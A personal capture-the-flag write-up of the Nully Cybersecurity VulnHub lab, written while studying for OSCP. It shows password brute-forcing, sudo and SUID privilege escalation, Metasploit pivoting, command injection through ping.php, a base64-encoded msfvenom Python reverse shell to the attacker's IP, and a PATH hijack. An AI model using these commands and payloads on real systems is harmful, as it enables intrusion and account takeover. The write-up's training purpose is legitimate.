# Nully Cybersecurity 1:

Hello, this is my first writeup, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/)) was the most enjoyable so far, so I decided to create a writeup on it. It is a nice easy-intermediate level machine, that taught me a lot about pivoting and the metasploit framework.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VMs IP : 192.168.1.6

next we're going to perform a basic nmap scan on it, to see if any exposed services.
```
nmap -sV 192.168.1.6
```
wields some interesting  results:
```
Nmap scan report for nully-cybersecurity-ctf (192.168.1.6)
Host is up (0.00083s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
110/tcp  open  pop3        Dovecot pop3d
2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  nagios-nsca Nagios NSCA
9000/tcp open  cslistener?
```

So aparently there's a web server worth checking out first with our browser at: `http//192.168.1.6`

There, the creator of this VM informs us that there are 3 hosts in the internal network of the VM:
- a mail server
- a web server (other than the one serving the instructions page)
- and a database server

the creator of the VM is also hinting that we should start from the mail server, which makes sence as we can see that it's exposed to the external network from our nmap results. He also gives as a mail account's credentials to check the inbox.

lets do that first.

## Rooting the mailServer
I will use netcat to connect to the pop3 port of the mail server and some basic pop3 commands:
```
test@TestPad:~$ nc 192.168.1.6 110
+OK Dovecot (Ubuntu) ready.
user pentester
+OK
pass qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
+OK Logged in.
list
+OK 1 messages:
1 657
.
retr 1
+OK 657 octets
Return-Path: <root@MailServer>
X-Original-To: pentester@localhost
Delivered-To: pentester@localhost
Received: by MailServer (Postfix, from userid 0)
	id 20AE4A4C29; Tue, 25 Aug 2020 17:04:49 +0300 (+03)
Subject: About server
To: <pentester@localhost>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200825140450.20AE4A4C29@MailServer>
Date: Tue, 25 Aug 2020 17:04:49 +0300 (+03)
From: root <root@MailServer>

Hello,
I'm Bob Smith, the Nully Cybersecurity mail server administrator.
The boss has already informed me about you and that you need help accessing the server.
Sorry, I forgot my password, but I remember the password was simple.
.
^C
test@TestPad:~$ 
```
There's some very important pieces of info in that email:
- mailServers' admin is named Bob
- his password is simple

So we are going to try to bruteforce bob's password. 
We're going to use hydra, so I prepared two lists for that purpose.

One with possible simple usernames for bob and one for simple passwords

heres my bob_users.txt:
```
bob
bobby
Bob
BOB
Bobby
BOBBY
```
Noting fancy here, just simple variations of bob's name.

for the password list, i'm going to do as the VM's creator suggests:
```
cat rockyou.txt | grep bobby > bob_pass.txt
```
I'm going to use hydra to bruteforce the pop3 port. You can use whatever cracking tool you feel comfortable with.
```
hydra -L bob_users.txt -P bob_pass.txt 192.168.1.6 pop3
```
After a while we actually manage to crack bob's password for pop3. Its `bobby1985`. We're going to try it iver ssh, hoping that Bob, will be using the same password. And he actually is!!! Bob's a noob admin!

so now we can login to the mailServer as bob with:
```
ssh bob@192.168.1.6 -p2222
```
Once we get access, we need to investigate if there's a way to root the mailServer.

We're going to start with the obvious `sudo -l` which has some quite interesting results:
```
bob@MailServer:~$ sudo -l
Matching Defaults entries for bob on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on MailServer:
    (my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh
bob@MailServer:~$ ls -lart /opt/scripts/check.sh 
-rwxr-xr-x 1 bob bob 1259 Sep 15 09:50 /opt/scripts/check.sh
```
So bob can execute the /opt/scripts/check.sh script as the my2user without password and the script is also writeable by bob..

Lets go edit the script:
Just adding a `/bin/bash` at the end will do for spwaning a shell.

Now lets run the script as my2user:
```
sudo -u my2user /bin/bash /opt/scripts/check.sh
```
the script runs... and we're now logged in as my2user!!

lets do `sudo -l` again for the my2user:
```
my2user@MailServer:~$ sudo -l
Matching Defaults entries for my2user on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User my2user may run the following commands on MailServer:
    (root) NOPASSWD: /usr/bin/zip
```
Luckily for us the my2user can execute `/usr/bin/zip` as root without a password. Doing a little googling, I found out that zip can execute arbitrary commands like this:
```
my2user@MailServer:~$ touch file
my2user@MailServer:~$ sudo zip 1.zip file -T --unzip-command="sh -c /bin/bash"
  adding: file (stored 0%)
root@MailServer:/home/my2user# 
```

and BOOM!! The mailServer is rooted!

Reading /root/1_flag.txt inform us that the webserver should be next.

## Rooting the webServer

After reading the root flag, we run a simple `ifconfig` on the mailServer, which also returns interesting results:

```
root@MailServer:/home/my2user# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.4  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:04  txqueuelen 0  (Ethernet)
        RX packets 3118  bytes 243770 (243.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2613  bytes 253615 (253.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Apparently the two other servers are hosted inside the `172.17.x.x` network, so lets run a simple nmap scan to validate that.

```
nmap -sV 172.17.0.0/24
```
validates the above statement, so we need to find a way to expose the webserver `172.17.0.5` to our external network, here's where pivoting comes in handy.

We open up a new terminal and fire `msfconsole` up. We are going to need msfconsole's meterpreter shell to `autoroute` traffic to the external network using the mailServer as a stager host.

We are going to use bob's ssh creds to establish a meterpreter shell. So first we need to create an ssh connection in `msfconsole` using the scanner/ssh/ssh_login` script

```
use scanner/ssh/ssh_login
set rhosts 192.168.1.6
set rport 2222
set username bob
set password bobby1985
exploit
```

A new session will open in the background. Do a `sessions -l` to locate the session (eg. 1) and the `sessions -u 1` to upgrade it to a meterpreter shell. This will open a new session in the backgroung (eg. 2). Run `sessions -i 2` to use that session.

Once in the meterpreter shell:

run `autoroute` to add a route to the internal subnet
```
run autoroute -s 172.17.0.0/16
run autoroute -p
```

Finally we need to forward the web server port to a new port on the stager host:
>Be sure to scan th internal ntwork first. the IPs demonstratred her might not be the same.

```
portfwd add -l 8888 -p 80 -r 172.17.0.5
```
>Carefull on the port u use the portfwd on. Some ports might need to be explicitly overridef in Firefox, for a connection to be permitted

The internal website, should now be accessible from your browser at http://localhost:8888

Lets enumerate it:

```
dirb http://localhost:8888
```

We get some interesting results back:
```
-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://localhost:8888/ ----
+ http://localhost:8888/index.html (CODE:200|SIZE:209)                                                                                                                                                            
==> DIRECTORY: http://localhost:8888/ping/                                                                                                                                                                        
+ http://localhost:8888/robots.txt (CODE:200|SIZE:6)                                                                                                                                                              
+ http://localhost:8888/server-status (CODE:403|SIZE:276)                                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://localhost:8888/ping/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

The `ping` directory seems pretty interesting. lets navigate to it from our web browser.

Inside it we find a `ping.php` file which is way more interesting as php can be used to inject arbirtary code into the web server.

Lets try executing a simple command with `ping.php` from the web browser, like:

```
http://localhost:8888/ping/ping.php?host=127.0.0.1;whoami
```

Not suprisingly, remote code execution is a go as it returns:
```
Use the host parameter<pre>Array ( [0] => PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. [1] => 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms [2] => 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.091 ms [3] => 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.084 ms [4] => 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.098 ms [5] => [6] => --- 127.0.0.1 ping statistics --- [7] => 4 packets transmitted, 4 received, 0% packet loss, time 3077ms [8] => rtt min/avg/max/mdev = 0.015/0.072/0.098/0.033 ms [9] => www-data ) </pre>
```

The output to our second command is last, lets try to inject a payload that will create a reverse shell back to us.

So lets start by firing up a netcat listener in one terminal:
```
nc -lnvp 6666
```
and generate a nice payload with msfvenom in another:
```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.10 LPORT=6666 -f raw
```
produces:
```
Found a database at /home/test/.msf4/db, checking to see if it is started
Starting database at /home/test/.msf4/db...success
MSF web service is already running as PID 4231
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 649 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICAgc3VicHJvY2VzcyAgICAgICAgICwgICAgICAgb3MgICAgICAgIDsgaG9zdD0iMTkyLjE2OC4xLjEwIiAgICAgICAgOyBwb3J0PTY2NjYgICAgICAgIDsgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAgLCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7IHMuY29ubmVjdCgoaG9zdCAgICAgICAgICwgICAgICAgcG9ydCkpICAgICAgICA7IG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAgMCkgICAgICAgIDsgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAgLCAgICAgICAxKSAgICAgICAgOyBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICAsICAgICAgIDIpICAgICAgICA7IHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
```
>before we send the payload with the ping command, its useful to find out which version of python is supported in the webserver by executing the python --version and python3 --version commands through the ping.php Only python3 is supported, so make sure you change the initial patrt of the payload to python3.

Executing the payload through the `ping.php` page gets us a reverse shell in our `netcat` listener.

Lets break out from the restricted shell with `/bin/bash -i`. We then check `sudo -l` to no avail.

We then check for missconfigured suid:
```
www-data@WebServer:/home/oliver$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/python3
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
www-data@WebServer:/home/oliver$ 

```

python3 suid seems quite interesting, as it can be executed as oscar!

lets try a known GTFObin:
```
python3 -c "import os;os.execl('/bin/sh', 'sh', '-p')"
```
that should give as permission to read oscar's home directory, where a txt file with his password exists.

use that to properluy login as oscar:
```
id
uid=33(www-data) gid=33(www-data) euid=1000(oscar) groups=33(www-data)
cd /home/oscar
ls -lart
total 36
-rw-r--r-- 1 oscar oscar  807 Aug 25 16:11 .profile
-rw-r--r-- 1 oscar oscar 3771 Aug 25 16:11 .bashrc
-rw-r--r-- 1 oscar oscar  220 Aug 25 16:11 .bash_logout
drwx------ 2 oscar oscar 4096 Aug 25 20:09 .cache
drwxr-xr-x 1 root  root  4096 Aug 26 13:38 ..
-r-------- 1 oscar oscar   37 Aug 26 14:25 my_password
-rw------- 1 oscar oscar 2183 Aug 26 14:25 .viminfo
drwx------ 4 oscar oscar 4096 Aug 26 14:25 .
drwx------ 2 oscar oscar 4096 Aug 27 15:02 scripts
-rw------- 1 oscar oscar    0 Sep 18 06:03 .bash_history
cat myPassword
cat: myPassword: No such file or directory
cat my_password
H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o
su oscar
Password: H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o

whoami
oscar

/bin/bash -i  
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
oscar@WebServer:~$ 
```

Searching around, we find a `.secret` file containing oliver's passwors in /var/backups.
```
oscar@WebServer:/var/backups$ ls -lart
ls -lart
total 16
drwxr-xr-x 1 root   root   4096 Aug 25 16:20 ..
-rwxrwxrwx 1 oliver oliver   63 Aug 26 13:41 .secret
drwxr-xr-x 1 root   root   4096 Aug 26 13:41 .
oscar@WebServer:/var/backups$ cat .secret
cat .secret
Dont forget
my password - 4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF
oscar@WebServer:/var/backups$ su oliver                                     
su oliver
Password: 4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF
id
uid=1001(oliver) gid=1001(oliver) groups=1001(oliver)
/bin/bash -i
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
oliver@WebServer:/var/backups$ 
```
and now we are logged in as oliver! Lets hope we can root the webServer with this user.

After some searching, we didnt find anything interesting in oliver's account, bu we did find an interesting `scripts` folder in oscar's home, so lets exit back to oscar's shell and navigate to this `scripts` directory.
 Inside it there's a script with root privilleges that's apparently just calling the `date` command.
 ```
 oscar@WebServer:~/scripts$ ls -lart
ls -lart
total 28
-rwsr-xr-x 1 root  root  16784 Aug 26 14:14 current-date
drwx------ 4 oscar oscar  4096 Aug 26 14:25 ..
drwx------ 2 oscar oscar  4096 Aug 27 15:02 .
oscar@WebServer:~/scripts$ ./current-date
./current-date
Fri Sep 18 08:00:08 CEST 2020
oscar@WebServer:~/scripts$ date
date
Fri Sep 18 08:00:11 CEST 2020
oscar@WebServer:~/scripts$ 
```
Lets see if we can forge a fake date cmd that will give us root#
```
cd /tmp
oscar@WebServer:/tmp$ echo "bash -p" > date
echo "bash -p" > date
oscar@WebServer:/tmp$ ls -lart
ls -lart
total 12
drwxr-xr-x 1 root  root  4096 Aug 25 16:08 ..
drwxrwxrwt 1 root  root  4096 Sep 18 08:08 .
-rw-rw-r-- 1 oscar oscar    8 Sep 18 08:08 date
oscar@WebServer:/tmp$ chmod 777 date
chmod 777 date
oscar@WebServer:/tmp$ ls -lart
ls -lart
total 12
drwxr-xr-x 1 root  root  4096 Aug 25 16:08 ..
drwxrwxrwt 1 root  root  4096 Sep 18 08:08 .
-rwxrwxrwx 1 oscar oscar    8 Sep 18 08:08 date
oscar@WebServer:/tmp$ 
```
and lets add it to Oscar's path:
```
export PATH=/tmp:$PATH
```
Now we should be able to execute this script and get root!
```
oscar@WebServer:/tmp$ ~/scripts/current-date
~/scripts/current-date
id
uid=0(root) gid=0(root) groups=0(root),1000(oscar)
/nin/bash -i
bash: line 4: /nin/bash: No such file or directory
/bin/bash -i
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
root@WebServer:/tmp# cd /root
cd /root
root@WebServer:/root# ls -lart
ls -lart
total 40
-rw-r--r-- 1 root root   161 Dec  5  2019 .profile
-rw-r--r-- 1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 root root  4096 Aug 25 16:08 ..
-rw-r--r-- 1 root root   467 Aug 26 14:03 2_flag.txt
-rw-r--r-- 1 root root     0 Aug 26 14:20 .selected_editor
drwx------ 2 root root  4096 Aug 27 09:59 .ssh
-rwxr-xr-x 1 root root   215 Aug 27 14:43 .services
-rw------- 1 root root 10606 Aug 27 15:05 .viminfo
drwx------ 1 root root  4096 Aug 27 15:05 .
-rw------- 1 root root     0 Sep 18 06:03 .bash_history
root@WebServer:/root# cat 2_flag.txt
cat 2_flag.txt
 __          __  _ _       _                  
 \ \        / / | | |     | |                 
  \ \  /\  / /__| | |   __| | ___  _ __   ___ 
   \ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \
    \  /\  /  __/ | | | (_| | (_) | | | |  __/
     \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___|
                                              
                                             
Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
Now go to the Database server.
root@WebServer:/root# 
```

## Rooting the Database server

Now lets use one of our rooted machines to connect to the remaining host of the internal network `172.17.0.2`, in which our former `nmap` scan found an ftp port open.
```

root@MailServer:~# ftp 172.17.0.2
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:bob): anonymous
anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 pub
226 Directory send OK.
ftp> cd pub
cd pub
250 Directory successfully changed.
ftp> ls -lart
ls -lart
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 27 08:34 ..
drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 .
-rw-r--r--    1 ftp      ftp             0 Aug 27 09:35 test
drwxr-xr-x    2 ftp      ftp          4096 Aug 27 14:44 .folder
226 Directory send OK.
ftp> cd .folder
cd .folder
250 Directory successfully changed.
ftp> ls -lart
ls -lart
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            15 Aug 27 09:07 file.txt
drwxr-xr-x    3 ftp      ftp          4096 Aug 27 09:35 ..
-rw-r--r--    1 ftp      ftp           224 Aug 27 09:37 .backup.zip
drwxr-xr-x    2 ftp      ftp          4096 Aug 27 14:44 .
226 Directory send OK.
ftp> get file.txt
get file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for file.txt (15 bytes).
226 Transfer complete.
15 bytes received in 0.00 secs (23.5127 kB/s)
ftp> get .backup.zip
get .backup.zip
local: .backup.zip remote: .backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .backup.zip (224 bytes).
226 Transfer complete.
224 bytes received in 0.01 secs (24.2624 kB/s)
ftp> exit
exit
221 Goodbye.
```

the `file.txt` doesnt contain anything usefull, but .backup.zip is an encrypted archive Lets crack it open.

> Use the open meterpreter shell to download your files locally

I used `john` for that purpose. So first we need to extract the hash out of the encrypted zip:
```
zip2john .backup.zip > hash
```
then we crack that and retrieve its password with:
```
john --wordlist=../wordlists/rockyou.txt hash

john --show hash
.backup.zip/creds.txt:1234567890:creds.txt:.backup.zip::.backup.zip

1 password hash cracked, 0 left
```
Using this password, we can unzip .backup.txt and read donald's password:
```
donald:HBRLoCZ0b9NEgh8vsECS
```
Now, sine the last remaining open port of that server is an ssh one. I'm going to try these creds there.

..and BOOM! we're logged in as donald on what seems to be the database server.

Searching for any suid vulnerabilities gives promissing results:
```
donald@DatabaseServer:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/screen-4.5.0
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
donald@DatabaseServer:/home$ ls -lart /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1860280 Aug 27 09:50 /usr/bin/screen-4.5.0
```
screen can be run with root suid! Lets see if we can axploit that.
There's an interesting exploit on that screen version on [exploitdb](https://www.exploit-db.com/exploits/41154):

### To be continued..


